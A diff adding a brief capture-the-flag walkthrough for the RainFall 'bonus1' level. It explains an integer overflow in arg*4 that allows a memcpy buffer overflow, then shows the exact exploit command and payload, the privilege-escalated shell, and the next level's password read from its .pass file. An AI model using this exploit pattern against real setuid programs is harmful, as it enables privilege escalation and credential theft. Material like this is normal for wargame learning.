@@ -1,0 +1,15 @@
+
+this simple code have a little problem with that arg * 4 which is gonna overflow the two most significant bits of the number
+considering that in the standard int notation the msb is the min int we can simpli add numbers to it
+in order to get the number that we want, in this case we have a buffer of 40 saved before the number with a size of 40
+if we manage to get a copy of 44 elements we can overflow and overrite the int with the check number:
+
+-2147483648 + 11 = -2147483637 (11 * 4 == 44)
+0x574F4C46 -> \x46\x4c\x4f\x57
+
+
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print("A"*40 + "\x46\x4c\x4f\x57")')
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
